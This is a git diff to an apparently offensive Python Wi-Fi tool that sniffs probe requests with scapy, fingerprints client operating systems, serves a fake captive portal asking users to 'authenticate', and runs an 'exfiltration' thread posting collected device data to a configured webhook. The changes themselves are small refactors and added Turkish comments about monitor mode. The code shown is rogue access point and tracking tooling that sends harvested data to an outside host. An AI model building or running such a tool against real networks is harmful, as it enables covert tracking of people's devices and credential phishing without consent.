@@ -4,6 +4,7 @@ import yaml
 import http.server
 import socketserver
 import requests
+import time
 from scapy.all import sniff, ProbeReq
 from core.fingerprint import detect_os
 
@@ -21,13 +22,16 @@ def sniffer_thread(config):
         if packet.haslayer(ProbeReq):
             analysis_queue.put(packet)
 
+    # Not: Bu kısmın çalışması için arayüzün Monitor Mode'da olması gerekir.
+    # Eğer aynı arayüz Captive Portal (AP) için kullanılıyorsa scapy paket yakalayamaz.
     sniff(iface=config['system']['interface'], prn=packet_callback, store=0)
 
 def analysis_thread():
     print("[*] Starting Analysis Thread...")
     while True:
         packet = analysis_queue.get()
-        if packet is None: break
+        if packet is None: 
+            break
         os_type = detect_os(packet)
         mac = packet.addr2 if hasattr(packet, 'addr2') else "Unknown"
         result = {"mac": mac, "os": os_type, "timestamp": "now"}
@@ -43,7 +47,6 @@ def portal_thread(config):
             self.send_response(200)
             self.send_header("Content-type", "text/html")
             self.end_headers()
-            # In a full implementation, this would call core/portal.py to serve the OS-specific template
             self.wfile.write(b"<html><body><h1>Welcome to the Captive Portal</h1><p>Please authenticate to continue.</p></body></html>")
 
     with socketserver.TCPServer((config['captive_portal']['dns_server'], config['captive_portal']['port']), PortalHandler) as httpd:
@@ -54,7 +57,8 @@ def exfiltration_thread(config):
     webhook_url = config['exfiltration']['webhook_url']
     while True:
         data = exfiltration_queue.get()
-        if data is None: break
+        if data is None: 
+            break
         try:
             requests.post(webhook_url, json=data, timeout=5)
             print(f"[>] Exfiltrated data for {data.get('mac')}")
@@ -77,7 +81,6 @@ def main():
 
     try:
         while True:
-            import time
             time.sleep(1)
     except KeyboardInterrupt:
         print("\n[!] Shutting down...")
